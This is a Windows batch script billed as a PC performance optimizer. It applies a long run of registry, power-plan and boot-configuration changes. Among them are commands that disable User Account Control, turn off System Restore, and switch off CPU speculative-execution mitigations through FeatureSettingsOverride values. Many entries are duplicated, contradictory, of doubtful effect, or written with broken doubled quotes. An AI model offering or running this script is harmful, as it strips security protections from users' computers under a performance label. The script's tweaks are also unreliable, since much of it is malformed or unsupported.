Title Ultra OTM PC By Fyumi
@echo off
cls
for /f %%t in ('Reg query "HKLM\System\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}" /t REG_SZ /s /e /f "Intel" ^| findstr "HKEY"') do (

	Reg.exe add "%%t" /v "Disable_OverlayDSQualityEnhancement" /t REG_DWORD /d "1" /f
    Reg.exe add "%%t" /v "IncreaseFixedSegment" /t REG_DWORD /d "1" /f
    Reg.exe add "%%t" /v "AdaptiveVsyncEnable" /t REG_DWORD /d "0" /f
    Reg.exe add "%%t" /v "DisablePFonDP" /t REG_DWORD /d "1" /f
    Reg.exe add "%%t" /v "EnableCompensationForDVI" /t REG_DWORD /d "1" /f
    Reg.exe add "%%t" /v "NoFastLinkTrainingForeDP" /t REG_DWORD /d "0" /f
    Reg.exe add "%%t" /v "ACPowerPolicyVersion" /t REG_DWORD /d "16898" /f
    Reg.exe add "%%t" /v "DCPowerPolicyVersion" /t REG_DWORD /d "16642" /f
)


Reg.exe add "HKLM\Software\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "512" /f
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v CoreParkingDisabled /t REG_DWORD /d 0 /f
powercfg -setacvalueindex scheme_current sub_processor CPMINCORES 100
powercfg /setactive SCHEME_CURRENT
bcdedit /set allowedinmemorysettings 0x0
bcdedit /set isolatedcontext No
powercfg /setACvalueindex scheme_current SUB_PROCESSOR SYSCOOLPOL 1
powercfg /setDCvalueindex scheme_current SUB_PROCESSOR SYSCOOLPOL 1
powercfg /setactive SCHEME_CURRENT
bcdedit /set {current} numproc %NUMBER_OF_PROCESSORS% 
powercfg -setacvalueindex scheme_current SUB_SLEEP AWAYMODE 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current SUB_SLEEP ALLOWSTANDBY 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current SUB_SLEEP HYBRIDSLEEP 0
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor PROCTHROTTLEMIN 100
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor IDLESCALING 1
powercfg /setactive SCHEME_CURRENT
powercfg -setacvalueindex scheme_current sub_processor THROTTLING 0
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
cls
chcp 437 > nul
PowerShell -Command "Disable-MMAgent -PageCombining" > nul 2>&1
chcp 65001 > nul
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d "1024" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionPoolSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SessionViewSize" /t REG_DWORD /d "192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemPages" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PhysicalAddressExtension" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverride" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "FeatureSettingsOverrideMask" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "IoPageLockLimit" /t REG_DWORD /d "16710656" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PoolUsageMaximum" /t REG_DWORD /d "96" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "Start" /t REG_DWORD /d "4" /f
cls
PowerShell -Command "Set-MMAgent -MaxOperationAPIFiles 2048" > nul 2>&1
PowerShell -Command "Set-Service sysmain -StartupType Automatic" > nul 2>&1
PowerShell -Command "Start-Service sysmain" > nul 2>&1
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "DpiMapIommuContiguous" /t REG_DWORD /d "1" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolSize" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "PagedPoolQuota" /t REG_DWORD /d "0" /f
Reg.exe add ""HKCU\Control Panel\Accessibility\StickyKeys"" /v ""Flags"" /t REG_SZ /d ""506"" /f
Reg.exe add ""HKCU\Control Panel\Accessibility\ToggleKeys"" /v ""Flags"" /t REG_SZ /d ""58"" /f
reg add ""HKCU\Control Panel\Accessibility\MouseKeys"" /v ""Flags"" /t REG_SZ /d ""0"" /f 
reg add ""HKCU\Control Panel\Accessibility\MouseKeys"" /v ""MaximumSpeed"" /t REG_SZ /d ""80"" /f 
reg add ""HKCU\Control Panel\Accessibility\MouseKeys"" /v ""TimeToMaximumSpeed"" /t REG_SZ /d ""3000"" /f 
Reg.exe add ""HKCU\Control Panel\Accessibility\MouseKeys"" /v ""Flags"" /t REG_SZ /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\ThreadScheduling"" /v ""ThreadBoostType"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\ThreadScheduling"" /v ""ThreadSchedulingModel"" /t REG_DWORD /d ""2"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\ThreadScheduling"" /v ""EnableThreadMigration"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\6fe69556-704a-47a0-8f24-c28d936fda47"" /v ""ConfigurableTSCIncreaseEnabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" /v ""NumberOfInitialSessions"" /t REG_DWORD /d ""2"" /f
Reg.exe add ""HKLM\System\ControlSet001\Control\PriorityControl"" /v ""ConvertibleSlateMode"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"" /v ""Max Cached Icons"" /t REG_SZ /d ""4096"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability"" /v ""TimeStampInterval"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability"" /ve /t REG_DWORD /d ""3"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability"" /v ""LastAliveStamp"" /t REG_BINARY /d ""d0baad0b"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\Audiosrv"" /v ""ErrorControl"" /t REG_DWORD /d ""2"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v ""AdjustDpcThreshold"" /t REG_DWORD /d ""800"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v ""DeepIoCoalescingEnabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v ""IdealDpcRate"" /t REG_DWORD /d ""800"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl"" /v ""SchedulerAssistThreadFlagOverride"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability"" /v ""DirtyShutdown"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Reliability"" /v ""DirtyShutdownTime"" /t REG_BINARY /d ""e407070000000c000a0019001100be00"" /f
Reg.exe add ""HKLM\System\ControlSet001\Control\PriorityControl"" /v ""GlobalMaxTcpWindowSize"" /t REG_DWORD /d ""2430592"" /f
Reg.exe add ""HKLM\System\ControlSet001\Control\PriorityControl"" /v ""IRQ8Priority"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\System\ControlSet001\Control\PriorityControl"" /v ""IRQ16Priority"" /t REG_DWORD /d ""2"" /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v HungAppTimeout /t REG_SZ /d 1000 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v MenuShowDelay /t REG_SZ /d 8 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d 2000 /f
REG ADD "HKEY_CURRENT_USER\Control Panel\Desktop" /v LowLevelHooksTimeout /t REG_SZ /d 1000 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLowDiskSpaceChecks /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v LinkResolveIgnoreLinkInfo /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoResolveSearch /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoResolveTrack /t REG_DWORD /d 1 /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoInternetOpenWith /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" /v WaitToKillServiceTimeout /t REG_SZ /d 2000 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /V "DisableSR" /T REG_DWORD /D 1 /F
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Accessibility\MouseKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\StickyKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\ToggleKeys" /v "Flags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInstrumentation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Copy To" /ve /t REG_SZ /d "{C2FBB630-2971-11D1-A18C-00C04FD75D13}" /f
Reg.exe add "HKCR\AllFilesystemObjects\shellex\ContextMenuHandlers\Move To" /ve /t REG_SZ /d "{C2FBB631-2971-11D1-A18C-00C04FD75D13}" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f
Reg.exe add "HKCU\Control Panel\Mouse" /v "MouseHoverTime" /t REG_SZ /d "8" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add ""HKLM\System\ControlSet001\Control\PriorityControl"" /v ""UseZeroBroadcast"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" /v ""HeapDeCommitFreeBlockThreshold"" /t REG_DWORD /d ""16384"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Watchdog\TimerCheck"" /v ""TimerCheckFlags"" /t REG_DWORD /d ""3"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\bc5038f7-23e0-4960-96da-33abaf5935ec\GlobalPowerPolicy"" /v ""GlobalTimerResolutionRequests"" /t REG_DWORD /d ""156250"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Throttle"" /v ""PerfEnablePackageIdle"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap"" /v ""CommitLimit"" /t REG_DWORD /d ""4294967295"" /f
Reg.exe add ""HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap"" /v ""CommitTarget"" /t REG_DWORD /d ""4294967295"" /f
Reg.exe add ""HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap"" /v ""NoCapAllowMappedIOForAllProcesses"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap"" /v ""IOBandwidth"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""EnablePerCpuClockTickScheduling"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""CsEnabled"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKCU\Software\Microsoft\Multimedia"" /v ""LowLatencyEnabled"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKCU\Software\Microsoft\Multimedia\MediaPlayer"" /v ""MfBufferingThreshold"" /t REG_DWORD /d ""2500"" /f
Reg.exe delete ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive"" /v ""ForceEnableMutantAutoboost"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Executive"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Superfetch"" /v ""AdminEnable"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Superfetch"" /v ""MemCompressionOptions"" /t REG_DWORD /d ""255"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\NUMA"" /v ""SplitLargeNodes"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnableUserModeCache"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnableLowLatencyIo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel"" /v ""EnableFsCacheHost"" /t REG_DWORD /d ""1"" /f
